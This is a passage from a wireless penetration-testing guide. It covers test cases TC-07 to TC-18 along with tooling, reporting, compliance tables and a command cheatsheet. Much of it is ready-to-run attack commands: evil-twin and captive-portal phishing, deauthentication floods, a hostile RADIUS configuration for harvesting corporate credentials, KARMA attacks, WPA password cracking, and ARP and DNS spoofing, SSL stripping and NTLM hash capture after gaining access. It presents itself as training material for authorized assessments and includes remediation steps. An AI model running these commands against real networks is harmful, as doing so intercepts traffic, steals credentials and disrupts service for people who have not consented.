# Launches Evil Twin + phishing page requiring "firmware upgrade" password
```

**Automated Method (Fluxion):**

```bash
git clone https://github.com/FluxionNetwork/fluxion
cd fluxion && sudo bash fluxion.sh
# Interactive menu: select target → Evil Twin + handshake verification
```

**Expected Result:** Clients connect to fake AP. All traffic intercepted. Credentials captured via phishing portal or clear-text analysis.

**Remediation:** Use WPA2-Enterprise with certificate pinning (clients verify AP certificate). Train users to verify certificates. Deploy WIDS (Wireless Intrusion Detection Systems). Enable 802.11w (PMF) to prevent deauthentication attacks.

---

### TC-07: Captive Portal Phishing Attack

**Description:** Deploy a rogue AP with a web-based captive portal that mimics the real network login page (hotel WiFi, corporate portal). Users unknowingly submit real credentials.

**Tools:** WifiPumpkin3, Fluxion, Wifiphisher, custom hostapd + Apache

**Steps (WifiPumpkin3):**

```bash
pip3 install wifipumpkin3
sudo wifipumpkin3

# Inside WP3 shell:
set interface wlan0
set ssid "Free_Hotel_WiFi"
start

# In a second terminal, configure proxies
ap.config ssid "CorporateWiFi"
set proxy captiveflask
set captiveflask template hotel_login
start
```

**Expected Result:** Users connect, see convincing login page, submit credentials captured in `/tmp/creds.log`.

**Remediation:** Deploy certificate-based authentication (EAP-TLS). User security awareness training.

---

### TC-08: Deauthentication / DoS Attack

**Description:** 802.11 management frames (deauthentication and disassociation) are unauthenticated in WPA2. An attacker can spoof them, forcing all clients to disconnect from an AP (Denial of Service). This is also used to force re-authentication for handshake capture.

**Preconditions:** Monitor mode capable adapter. Target BSSID known.

**Tools:** aireplay-ng, MDK4, Bettercap

**Steps:**

```bash
# Single client deauth (5 frames)
sudo aireplay-ng --deauth 5 \
    -a AA:BB:CC:DD:EE:FF \   # AP BSSID
    -c BB:CC:DD:EE:FF:00 \   # Client MAC
    wlan0mon

# Broadcast deauth (all clients, continuous)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# MDK4 — more aggressive, beacon flooding + deauth
sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF -c 6
# Mode: d = deauthentication/disassociation attack

# Bettercap deauth
sudo bettercap -iface wlan0mon
wifi.deauth AA:BB:CC:DD:EE:FF

# Channel hopping DoS (attack all APs on all channels)
sudo mdk4 wlan0mon d -s 50 -c 1,2,3,4,5,6
```

**Expected Result:** All connected clients disconnected. Network unusable during attack.

**Remediation:** Enable **802.11w (PMF — Protected Management Frames)**. WPA3-SAE mandates PMF, making deauth attacks infeasible. Upgrade infrastructure to WPA3.

---

### TC-09: WPA2-Enterprise (RADIUS) Attack

**Description:** WPA2-Enterprise uses EAP (Extensible Authentication Protocol) with a RADIUS server. Many implementations (PEAP-MSCHAPv2, EAP-TTLS) are vulnerable when clients do not validate the server certificate. A hostile RADIUS server can harvest credentials.

**Subtypes:**
- **EAP-MD5:** Completely vulnerable to offline cracking
- **PEAP-MSCHAPv2:** Vulnerable if certificate validation disabled (most corporate clients)
- **EAP-TTLS:** Vulnerable to downgrade if cert not validated
- **EAP-LEAP:** Vulnerable to offline dictionary attack (ASLEAP)

**Tools:** hostapd-wpe, EAPHammer, Bettercap, ASLEAP

**Steps (hostapd-wpe):**

```bash
# Step 1: Setup fake enterprise AP with hostile RADIUS
# hostapd-wpe is included in Kali
cat > /tmp/enterprise.conf << EOF
interface=wlan0
driver=nl80211
ssid=CorporateWiFi_5G
hw_mode=g
channel=6
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=/etc/hostapd-wpe/eap_users
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
dh_file=/etc/hostapd-wpe/certs/dh
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
EOF

sudo hostapd-wpe /tmp/enterprise.conf
# Credentials appear in /tmp/hostapd-wpe.log or stdout
```

**Steps (EAPHammer):**

```bash
git clone https://github.com/s0lst1c3/eaphammer
cd eaphammer
sudo python3 eaphammer --cert-wizard  # Generate certificates first

sudo python3 eaphammer \
    -i wlan0 \
    --essid "CorporateWiFi" \
    --auth wpa-eap \
    --creds
# Captures MSCHAPv2 challenge-response hashes
```

**Cracking captured hashes:**

```bash
# ASLEAP — cracks LEAP/PPTP/MSCHAPv2
asleap -r hostapd-wpe.log -W /usr/share/wordlists/rockyou.txt

# hashcat — crack NTLMv2
hashcat -m 5500 ntlmv2_hashes.txt wordlist.txt    # NetNTLMv1
hashcat -m 5600 ntlmv2_hashes.txt wordlist.txt    # NetNTLMv2
```

**Expected Result:** Domain credentials (username + password) captured for corporate users.

**Remediation:** Configure all clients to validate server certificate (CA pinning). Use EAP-TLS (certificate-based mutual authentication — no passwords). Implement WIDS to detect rogue APs. User training on certificate warnings.

---

### TC-10: KRACK Attack

**Description:** Key Reinstallation Attack (2017, CVE-2017-13077 through 13088). Exploits the 4-way handshake by replaying/retransmitting handshake messages, causing the client to reinstall an already-used key with a zeroed nonce, enabling decryption of traffic.

**Status:** Largely patched in 2017–2018. Most modern devices are not vulnerable. Primarily affects legacy/unpatched clients.

**Tools:** krackattacks-poc-zerokey (PoC), krackattacks-scripts

```bash
git clone https://github.com/vanhoefm/krackattacks-scripts
cd krackattacks-scripts
# Follow setup instructions; requires specific hardware config
python3 krack-all-zero-tk.py
```

**Remediation:** Apply all vendor security patches. KRACK is fully mitigated in current firmware. Test to confirm patching.

---

### TC-11: Management Frame Injection (MDK4)

**Description:** MDK4 can inject various management frame attacks: beacon flooding (creates hundreds of fake SSIDs), authentication flood (overwhelms AP authentication state machine), disassociation flood, and SSID brute force.

**Tools:** MDK4

```bash
# Beacon flood — creates 1000 fake SSIDs
sudo mdk4 wlan0mon b -f /tmp/ssid_list.txt -a -s 1000
# Creates confusion and may cause AP to crash

# Authentication flood (overwhelms AP state table)
sudo mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF

# Probe Request flood
sudo mdk4 wlan0mon p -t AA:BB:CC:DD:EE:FF

# SSID brute force (hidden SSID enumeration)
sudo mdk4 wlan0mon p -f /tmp/ssid_wordlist.txt -t AA:BB:CC:DD:EE:FF -s 100
```

**Remediation:** Enable 802.11w PMF. Rate-limit management frame processing. WIDS detection. Upgrade to WPA3.

---

### TC-12: MAC Address Spoofing & Filtering Bypass

**Description:** MAC filtering is not a security control — MAC addresses are transmitted in plaintext in every 802.11 frame and can be trivially spoofed. An attacker observes a valid client MAC and clones it.

**Tools:** macchanger, ip, airmon-ng

```bash
# View current MAC
ip link show wlan0

# Observe connected clients in airodump-ng
# Note a CLIENT MAC address (STATION column)

# Clone the client MAC
sudo ip link set wlan0 down
sudo macchanger -m BB:CC:DD:EE:FF:00 wlan0
sudo ip link set wlan0 up

# Or random MAC
sudo macchanger -r wlan0

# Verify change
ip link show wlan0
macchanger -s wlan0
```

**Expected Result:** Bypass MAC filtering; AP accepts connection from spoofed MAC.

**Remediation:** Do NOT rely on MAC filtering as a security control. Use 802.1X (WPA2-Enterprise) for proper access control. MAC filtering is only useful as an additional hurdle, not a primary defense.

---

### TC-13: Hidden SSID Discovery

**Description:** Hiding an SSID (disabling SSID broadcasting) is a security-through-obscurity technique. The SSID is still transmitted in Probe Request/Response frames and can be easily discovered.

**Tools:** airodump-ng, aireplay-ng, MDK4

```bash
# Method 1: Passive wait — airodump-ng reveals hidden SSIDs when clients associate
sudo airodump-ng wlan0mon
# Hidden SSIDs show as "" or "<length: N>"
# Wait for a client to probe/associate — SSID is revealed

# Method 2: Force deauth to trigger re-probe
sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF wlan0mon
# Watch airodump for SSID revelation

# Method 3: MDK4 SSID brute force
sudo mdk4 wlan0mon p -f /usr/share/wordlists/rockyou.txt \
    -t AA:BB:CC:DD:EE:FF -s 300

# Method 4: Bettercap
wifi.recon on
wifi.show  # Hidden APs listed with length hints
```

**Expected Result:** Hidden SSID revealed in under 60 seconds if any client is connected.

**Remediation:** Hidden SSIDs provide no real security. Use proper authentication (WPA2-Enterprise). Disable SSID hiding and focus on strong encryption and authentication.

---

### TC-14: Client-Side & Probe Request Attacks

**Description:** When clients search for known networks, they broadcast **Probe Requests** containing previously connected SSIDs. Attackers can harvest this list (PNL — Preferred Network List) and create fake APs matching those SSIDs to trigger automatic connection.

**Tools:** Kismet, Bettercap, MANA toolkit, MDK4

```bash
# Harvest probe requests with Kismet
sudo kismet -c wlan0mon
# Navigate to Clients → SSID Probes

# Bettercap probe monitoring
sudo bettercap -iface wlan0mon
wifi.recon on
events.stream on   # Shows probe requests in real time

# KARMA/MANA attack — respond to all probes
# Using hostapd-mana
git clone https://github.com/sensepost/hostapd-mana
cd hostapd-mana && make install
# Configure hostapd-mana.conf with mana_loud=1 (respond to all probes)
sudo hostapd-mana /etc/hostapd-mana/hostapd-mana.conf
```

**Expected Result:** Collect target's PNL (Preferred Network List). KARMA attack: clients automatically connect to attacker's AP.

**Remediation:** Disable "auto-connect" to remembered networks in OS settings. Periodically clear saved WiFi networks list. Use a VPN on any network. Modern OS updates suppress broadcast probe requests.

---

### TC-15: WPA3-SAE Dragonblood / Downgrade Attack

**Description:** WPA3-SAE (Simultaneous Authentication of Equals) replaced the PSK 4-way handshake with Dragonfly key exchange. Dragonblood (2019, CVE-2019-9494, 9496) found side-channel timing attacks and downgrade vulnerabilities. Patched in 2019, but misconfigured transition mode (WPA2/WPA3 mixed) still allows downgrade to WPA2 on some APs.

**Tools:** Wacker (SAE brute force), custom scripts

```bash
# Check if AP uses WPA3 Transition Mode
sudo airodump-ng wlan0mon
# AUTH column: SAE = pure WPA3, PSK+SAE = transition mode

# Transition Mode Downgrade — force WPA2 association
# Most modern tools auto-attempt WPA2 when WPA3/WPA2 mixed mode detected

# SAE brute force with Wacker (for research purposes)
git clone https://github.com/blunderbuss-wctf/wacker
cd wacker
sudo python3 wacker.py --wordlist rockyou.txt \
    --ssid "TargetNetwork" --bssid AA:BB:CC:DD:EE:FF \
    --interface wlan0mon
```

**Remediation:** Enable WPA3-Only mode (disable transition mode). Keep AP firmware updated. Patch CVE-2019-9494/9496 via firmware updates.

---

### TC-16: KARMA Attack

**Description:** The KARMA attack exploits client Probe Requests. An attacker's AP responds to every probe request with a matching SSID, causing vulnerable clients to automatically connect. This exploits the trust clients have in previously connected networks.

**Tools:** HOSTAPD-MANA, WiFi Pineapple, airbase-ng

```bash
# airbase-ng KARMA mode
sudo airbase-ng -P -C 30 -e "FreeWiFi" \
    -v wlan0mon
# -P = KARMA mode (respond to all probes)
# -C = keep alive beacon interval

# WiFi Pineapple automates this via web interface
# PineAP module → Enable KARMA

# HOSTAPD-MANA configuration
# In hostapd-mana.conf:
# mana_loud=1  — respond to all SSIDs
# mana_wpe=1   — enable WPE (credential harvesting)
```

**Expected Result:** Devices auto-connect to attacker AP, enabling MitM.

**Remediation:** Modern OS (iOS 14+, Android 10+, Windows 10+) randomize probe requests and suppress SSID-specific probes. Update devices. Disable auto-join on open networks.

---

### TC-17: Offline Password Cracking (Hashcat)

**Description:** After capturing WPA handshakes or PMKIDs, offline cracking is used to recover the passphrase. GPU-accelerated tools can test millions of candidates per second.

**Tools:** Hashcat, John the Ripper, Crunch (wordlist generator)

```bash
# ─── Hashcat — WPA2 Handshake / PMKID ───
# Mode 22000 = WPA-PBKDF2-PMKID+EAPOL (unified modern format)

# Dictionary attack with rules
hashcat -m 22000 target.hc22000 \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    -O --session=wpa-crack

# Multiple wordlists
hashcat -m 22000 target.hc22000 \
    words1.txt words2.txt words3.txt \
    -r rules/dive.rule

# Brute force — all printable chars, 8 chars
hashcat -m 22000 target.hc22000 -a 3 ?a?a?a?a?a?a?a?a

# Combinator attack (combine two wordlists)
hashcat -m 22000 target.hc22000 -a 1 words1.txt words2.txt

# Prince attack (probabilistic infinite chaining)
hashcat -m 22000 target.hc22000 -a 6 wordlist.txt ?d?d?d?d

# Show results
hashcat -m 22000 target.hc22000 --show

# ─── Crunch — Custom Wordlist Generation ───
# Generate all 8-char combos of specific chars
crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric \
    -o custom_wordlist.txt

# Pattern-based (e.g., word + 4 digits)
crunch 8 12 -t Company@@@@ -o company_list.txt

# ─── John the Ripper ───
john --wordlist=/usr/share/wordlists/rockyou.txt \
    --format=wpapsk-pmk target.hccapx
john --show --format=wpapsk-pmk target.hccapx

# ─── CUPP — Common User Passwords Profiler ───
git clone https://github.com/Mebus/cupp
python3 cupp/cupp.py -i   # Interactive — generates personalized wordlist
```

**Benchmarks (approximate, varies by GPU):**

| Hardware | WPA2 Speed |
|----------|-----------|
| RTX 3090 | ~1.2 M/s |
| RTX 4090 | ~2.5 M/s |
| RX 6900 XT | ~800 K/s |
| CPU only (i9) | ~50 K/s |

**Remediation:** Use random passphrases of 20+ characters from the full character set. A 20-character random passphrase takes billions of years to brute force even with GPU clusters.

---

### TC-18: Post-Exploitation & Lateral Movement

**Description:** After gaining WiFi access, assess the internal network for additional vulnerabilities, data exposure, and lateral movement opportunities.

**Tools:** nmap, Metasploit, Bettercap, Wireshark, Responder, Netcat

```bash
# Step 1: Network discovery
sudo nmap -sn 192.168.1.0/24          # Ping sweep
sudo nmap -sV -O 192.168.1.0/24      # Service and OS detection
sudo nmap -p- -A 192.168.1.1          # Full port scan on gateway

# Step 2: ARP Spoofing / MitM (Bettercap)
sudo bettercap -iface wlan0
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
net.sniff on           # Passive sniffing of all traffic

# Step 3: DNS Spoofing
set dns.spoof.domains corporate.example.com
set dns.spoof.address 192.168.1.200   # Attacker IP
dns.spoof on

# Step 4: SMB credential harvesting (Responder)
sudo responder -I wlan0 -wrfv
# Harvests NTLM hashes from Windows clients

# Step 5: SSL Stripping
bettercap sslstrip on   # Downgrade HTTPS to HTTP

# Step 6: Traffic capture
sudo wireshark -i wlan0 -k -w /tmp/internal_traffic.pcap

# Step 7: Network pivoting
# If VPN or internal segments found, use:
sshuttle -r user@internal_host 10.0.0.0/8 172.16.0.0/12
```

**Expected Result:** Map internal assets, capture credentials, identify further vulnerabilities.

**Remediation:** Network segmentation (isolate WiFi from internal LAN with firewall rules). Force all traffic through VPN. Enable HTTPS everywhere with HSTS. Deploy NAC (Network Access Control).

---

## 11. Advanced Techniques & Tools

### 11.1 Pwnagotchi (AI-Driven Handshake Capture)

Pwnagotchi is an AI-powered (A2C reinforcement learning) device running on a Raspberry Pi that autonomously roams and collects WPA handshakes.

```bash
# Flash Pwnagotchi image to SD card
# https://pwnagotchi.ai/getting-started/

# Configure /etc/pwnagotchi/config.toml
main.name = "pwnagotchi"
main.lang = "en"
ui.display.type = "waveshare_2"

# Plugins: grid (wardriving), bt-tether, wigle integration
```

### 11.2 Scapy — Custom Frame Crafting

```python
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

# Craft custom deauthentication frame
def deauth_frame(ap_mac, client_mac):
    dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
    deauth = Dot11Deauth(reason=7)
    frame = RadioTap()/dot11/deauth
    return frame

# Send 100 deauth frames
sendp(deauth_frame("AA:BB:CC:DD:EE:FF", "FF:FF:FF:FF:FF:FF"), 
      iface="wlan0mon", count=100, inter=0.1, verbose=True)
```

### 11.3 ZigBee / IoT Protocol Testing

```bash
# ZigBee sniffing with CC2531 dongle + KillerBee
pip install killerbee

# Sniff ZigBee traffic
zbdump -f zigbee_capture.pcap -c 15 -i /dev/ttyACM0

# Replay ZigBee frames
zbreplay -r zigbee_capture.pcap -i /dev/ttyACM0 -n 10

# Wireshark ZigBee analysis
wireshark zigbee_capture.pcap
```

### 11.4 Bluetooth Assessment

```bash
# Bluetooth scanning
sudo hciconfig hci0 up
sudo hcitool lescan           # BLE scan
sudo hcitool scan             # Classic BT scan

# BlueHydra — passive BLE/BT logging
sudo bluehyda

# Ubertooth BLE sniffing
ubertooth-btle -f -t AA:BB:CC:DD:EE:FF

# Gatttool — GATT attribute enumeration
gatttool -b AA:BB:CC:DD:EE:FF --primary
gatttool -b AA:BB:CC:DD:EE:FF --char-read -a 0x0003
```

### 11.5 SDR (Software Defined Radio) for RF Analysis

```bash
# Install GNU Radio + RTL-SDR
sudo apt install gqrx-sdr gnuradio rtl-sdr

# Scan for RF signals
rtl_sdr -f 433920000 -s 2000000 -g 40 capture.iq
gqrx  # GUI SDR analyzer

# Capture ISM band (433 MHz, 868 MHz, 915 MHz) for IoT signals
```

---

## 12. Automated Frameworks

### 12.1 Airgeddon — Complete Wireless Audit Suite

Airgeddon is a multi-use bash script that wraps most wireless attack tools in a menu-driven interface. **Most recommended for beginners and rapid assessments.**

```bash
git clone https://github.com/v1s1t0r1sh3r3/airgeddon
cd airgeddon
sudo bash airgeddon.sh

# Menu Navigation:
# 2. Put interface in monitor mode
# 3. Enable monitor mode
# 4. WPA/WPA2 attacks menu
#    → 4.1 Handshake capture
#    → 4.2 PMKID capture
# 5. WPS attacks menu
#    → 5.1 Reaver/Bully brute force
#    → 5.2 Pixie Dust
# 7. Evil Twin attacks menu
#    → 7.1 Simple sniffing Evil Twin
#    → 7.2 Captive portal Evil Twin
#    → 7.9 WPA2-Enterprise Evil Twin
```

### 12.2 Wifite2 — Automated Multi-Target Attack

```bash
# Attack all detected WPA/WPS networks
sudo wifite --wpa --wps --kill --dict /usr/share/wordlists/rockyou.txt

# Target specific BSSID only
sudo wifite --bssid AA:BB:CC:DD:EE:FF --kill

# WPA3 testing (uses SAE downgrade)
sudo wifite --wpa3

# Capture only (no cracking)
sudo wifite --wpa --capture-only
```

### 12.3 WifiPumpkin3 — Rogue AP Framework

```bash
sudo wifipumpkin3

# WP3 shell commands:
set interface wlan0
set ssid "FreePublicWiFi"
set proxy noproxy         # Transparent proxy
start

# Plugins available:
# captiveflask — captive portal phishing
# pumpkinproxy — HTTP traffic proxy
# sslstrip3 — SSL downgrade
# dns2proxy — DNS spoofing
```

---

## 13. Reporting & Remediation

### 13.1 Report Structure

A professional WiFi pentest report should include:

**Executive Summary:**
- Overall risk rating (Critical/High/Medium/Low)
- Top 3 most impactful findings
- Business risk context

**Technical Summary:**
- Scope and methodology
- Testing dates and authorized personnel
- Tools used

**Findings (per vulnerability):**
- Finding ID and title
- Severity (CVSS score preferred)
- Description (what was found)
- Evidence (screenshots, packet captures, command output)
- Attack scenario (how an attacker would exploit this)
- Affected systems (BSSID, SSID, network segment)
- Remediation steps (specific, prioritized)

**Appendices:**
- Raw tool output
- Network topology
- PCAP files (if authorized to share)

### 13.2 Severity Scoring

| CVSS Score | Severity | WiFi Example |
|------------|----------|--------------|
| 9.0–10.0 | Critical | WEP encryption, open network |
| 7.0–8.9 | High | WPS enabled, weak PSK, Evil Twin susceptible |
| 4.0–6.9 | Medium | PMKID exposure, missing PMF, probe leakage |
| 0.1–3.9 | Low | Hidden SSID, MAC filtering only |
| 0.0 | Informational | Best practice note, minor config issue |

### 13.3 Remediation Checklist

```
CRITICAL / HIGH:
[ ] Disable WEP immediately — migrate to WPA2/WPA3
[ ] Disable WPS on all APs
[ ] Replace weak PSK with 20+ character random passphrase
[ ] Deploy WPA2-Enterprise with certificate validation
[ ] Enable PMF (802.11w) on all APs
[ ] WIDS deployment for rogue AP detection

MEDIUM:
[ ] Upgrade to WPA3-SAE on supported hardware
[ ] Enable WPA3 Transition Mode on mixed environments
[ ] Implement certificate pinning for EAP clients
[ ] Segment WiFi from internal LAN (VLAN + firewall rules)
[ ] Disable SSID hiding (provides no real security)

LOW / INFORMATIONAL:
[ ] Remove MAC filtering or supplement with 802.1X
[ ] Schedule firmware update cycle (quarterly)
[ ] Implement SIEM logging for wireless events
[ ] Deploy Network Access Control (NAC) solution
[ ] User security awareness training on public WiFi risks
```

---

## 14. Compliance Standards

| Standard | Requirement | WiFi Controls |
|----------|------------|---------------|
| **PCI DSS 4.0 — Req 11.2.1** | Quarterly wireless scans for authorized APs | WIDS, authorized AP inventory |
| **PCI DSS 4.0 — Req 11.2.2** | Rogue AP detection | Continuous WIDS monitoring |
| **HIPAA** | Wireless data encryption | WPA2/WPA3 for ePHI transmission |
| **NIST SP 800-153** | Guidelines for wireless security | Full methodology reference |
| **ISO 27001 — A.13.1.2** | Network security of network services | Wireless network controls |
| **GDPR** | Data security for transmitted personal data | Encryption + access control |
| **SOC 2 Type II** | Transmission security | Wireless encryption controls |

---

## 15. Recommended Learning Resources

### 15.1 Free Online Resources

| Resource | URL | Type |
|----------|-----|------|
| HackTricks WiFi | https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi | Reference |
| Kali Linux Docs | https://www.kali.org/docs/ | Documentation |
| Offensive Security Blog | https://www.offensive-security.com/blog/ | Articles |
| WiFi Arsenal (GitHub) | https://github.com/0x90/wifi-arsenal | Tool Collection |
| Ivan Sincek Cheat Sheet | https://github.com/ivan-sincek/wifi-penetration-testing-cheat-sheet | Cheatsheet |
| Faisalfs10x Cheat Sheet | https://github.com/faisalfs10x/WiFi-Pentest-Cheat-Sheet | Cheatsheet |
| SecurityTube WiFi Megaprimer | http://www.securitytube.net/groups?operation=view&groupId=9 | Video |

### 15.2 Certifications

| Certification | Body | Focus |
|--------------|------|-------|
| **CWSP** (Certified Wireless Security Professional) | CWNP | Wireless security (industry gold standard) |
| **OSWP** (Offensive Security Wireless Professional) | Offensive Security | Practical wireless pentesting |
| **GAWN** (GIAC Assessing Wireless Networks) | SANS/GIAC | Wireless assessment methodology |
| **CEH** | EC-Council | Ethical hacking including wireless module |
| **CompTIA Security+** | CompTIA | Foundational; wireless security concepts |

### 15.3 Practice Platforms

| Platform | URL | Type |
|----------|-----|------|
| TryHackMe WiFi Hacking | https://tryhackme.com | Cloud-based labs |
| Hack The Box WiFi | https://academy.hackthebox.com | Structured courses |
| VulnHub | https://vulnhub.com | Downloadable VMs |
| Own test lab (hostapd) | — | Home lab |
| PortSwigger Web Academy | https://portswigger.net/web-security | Web + wireless context |

### 15.4 Key GitHub Repositories

```
https://github.com/aircrack-ng/aircrack-ng        — Main suite
https://github.com/v1s1t0r1sh3r3/airgeddon         — All-in-one framework
https://github.com/ZerBea/hcxdumptool              — PMKID capture
https://github.com/ZerBea/hcxtools                 — Conversion tools
https://github.com/derv82/wifite2                  — Automated attacks
https://github.com/FluxionNetwork/fluxion           — Evil Twin
https://github.com/wifiphisher/wifiphisher          — Phishing Evil Twin
https://github.com/P0cL4bs/wifipumpkin3             — Rogue AP framework
https://github.com/s0lst1c3/eaphammer              — Enterprise attacks
https://github.com/evilsocket/pwnagotchi            — AI wardriving
https://github.com/D3Ext/WEF                       — WiFi Exploitation Framework
https://github.com/0x90/wifi-arsenal               — Curated tool list
https://github.com/hashcat/hashcat                 — GPU cracking
https://github.com/bettercap/bettercap             — Network attack framework
https://github.com/kismetwireless/kismet           — Wireless IDS/stumbler
https://github.com/morrownr/USB-WiFi               — USB adapter compatibility DB
https://github.com/aircrack-ng/mdk4                — Management frame attacks
```

---

## 16. Quick Command Reference Cheatsheet

```bash
# ─────────────────────────────────────────────────────────────────
#  SETUP
# ─────────────────────────────────────────────────────────────────
sudo airmon-ng check kill                        # Kill interfering processes
sudo airmon-ng start wlan0                       # Enable monitor mode → wlan0mon
sudo airmon-ng stop wlan0mon                     # Stop monitor mode

# ─────────────────────────────────────────────────────────────────
#  RECONNAISSANCE
# ─────────────────────────────────────────────────────────────────
sudo airodump-ng wlan0mon                        # Scan all channels
sudo airodump-ng wlan0mon --channel 6            # Lock to channel 6
sudo wash -i wlan0mon --scan                     # Find WPS-enabled APs
sudo bettercap -iface wlan0mon                   # Bettercap interactive

# ─────────────────────────────────────────────────────────────────
#  CAPTURE
# ─────────────────────────────────────────────────────────────────
sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX \
    --channel 6 -w capture wlan0mon              # Handshake capture
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng \
    --enable_status=3                            # PMKID capture

# ─────────────────────────────────────────────────────────────────
#  INJECTION / DEAUTH
# ─────────────────────────────────────────────────────────────────
sudo aireplay-ng --deauth 5 \
    -a XX:XX:XX:XX:XX:XX wlan0mon               # Deauth clients
sudo aireplay-ng --test wlan0mon                 # Test injection

# ─────────────────────────────────────────────────────────────────
#  CONVERSION
# ─────────────────────────────────────────────────────────────────
hcxpcapngtool -o hash.hc22000 capture.pcapng     # Convert to hashcat format
cap2hccapx capture.cap capture.hccapx            # Old hccapx format

# ─────────────────────────────────────────────────────────────────
#  CRACKING
# ─────────────────────────────────────────────────────────────────
hashcat -m 22000 hash.hc22000 rockyou.txt \
    -r rules/best64.rule                         # Dictionary + rules
hashcat -m 22000 hash.hc22000 -a 3 ?a?a?a?a?a?a?a?a  # Brute force 8 chars
hashcat -m 22000 hash.hc22000 --show             # Show cracked
aircrack-ng -w rockyou.txt capture*.cap          # CPU dictionary

# ─────────────────────────────────────────────────────────────────
#  WPS
# ─────────────────────────────────────────────────────────────────
sudo reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX \
    -vv -K 1                                     # Pixie Dust
sudo reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX \
    -vv -r 3:15                                  # Standard brute force
sudo bully wlan0mon -b XX:XX:XX:XX:XX:XX -d -v 3 # Bully WPS

# ─────────────────────────────────────────────────────────────────
#  EVIL TWIN / ROGUE AP
# ─────────────────────────────────────────────────────────────────
sudo wifiphisher --essid "TargetSSID" \
    -phishing-pages firmware-upgrade             # Automated Evil Twin
sudo bash fluxion.sh                             # Fluxion interactive

# ─────────────────────────────────────────────────────────────────
#  ENTERPRISE (EAP)
# ─────────────────────────────────────────────────────────────────
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf  # Hostile RADIUS
sudo python3 eaphammer -i wlan0 --essid "Corp" \
    --auth wpa-eap --creds                       # EAPHammer

# ─────────────────────────────────────────────────────────────────
#  MAC SPOOFING
# ─────────────────────────────────────────────────────────────────
sudo ip link set wlan0 down
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0       # Set specific MAC
sudo macchanger -r wlan0                          # Random MAC
sudo ip link set wlan0 up

# ─────────────────────────────────────────────────────────────────
#  AUTOMATION
# ─────────────────────────────────────────────────────────────────
sudo wifite --wpa --wps --kill                   # Auto-attack all WPA/WPS
sudo bash airgeddon.sh                           # Airgeddon menu
sudo wifipumpkin3                                # WifiPumpkin3 framework

# ─────────────────────────────────────────────────────────────────
#  ANALYSIS
# ─────────────────────────────────────────────────────────────────
wireshark capture.pcap                           # GUI analysis
tshark -r capture.pcap -Y 'eapol' -V             # EAPOL frame analysis
tshark -r capture.pcap -Y 'wlan.fc.type==0'      # Management frames only
```

---

## ⚖️ Final Legal Reminder

> Wireless penetration testing is a powerful security discipline. Every technique in this guide can cause disruption, expose sensitive data, and may be illegal if performed without authorization. The pentesting community holds itself to the highest ethical standards.
>
> - ✅ **Always** have written authorization
> - ✅ **Always** define a clear scope
> - ✅ **Always** document your testing window
> - ✅ **Always** have an emergency stop procedure
> - ❌ **Never** test networks you do not own or have permission for
> - ❌ **Never** use these techniques for unauthorized access, surveillance, or personal gain

---

## 📚 References & Sources

- [NIST SP 800-153 — Guidelines for Securing Wireless LANs](https://csrc.nist.gov/publications/detail/sp/800-153/final)
- [NIST SP 800-115 — Technical Guide to Information Security Testing](https://csrc.nist.gov/publications/detail/sp/800-115/final)
- [HackTricks WiFi Pentesting](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi)
- [Aircrack-ng Official Documentation](https://www.aircrack-ng.org/documentation.html)
- [Hashcat Wiki](https://hashcat.net/wiki/)
- [Dragonblood Research (WPA3)](https://papers.mathyvanhoef.com/dragonblood.pdf)
- [KRACK Attack Research](https://www.krackattacks.com/)
- [Offensive Security OSWP Study Guide](https://www.offensive-security.com/wifu-oswp/)
- [PCI DSS v4.0 Requirements 11.x](https://www.pcisecuritystandards.org/)
- [OWASP Testing Guide — Wireless](https://owasp.org/www-project-web-security-testing-guide/)

---

*Guide maintained for educational and authorized security assessment purposes only. Last updated: 2025–2026.*
*Compiled from: NIST, Offensive Security, Aircrack-ng documentation, HackTricks, Deepstrike, PurpleSec, Qualysec, EC-Council, GitHub security research repositories.*
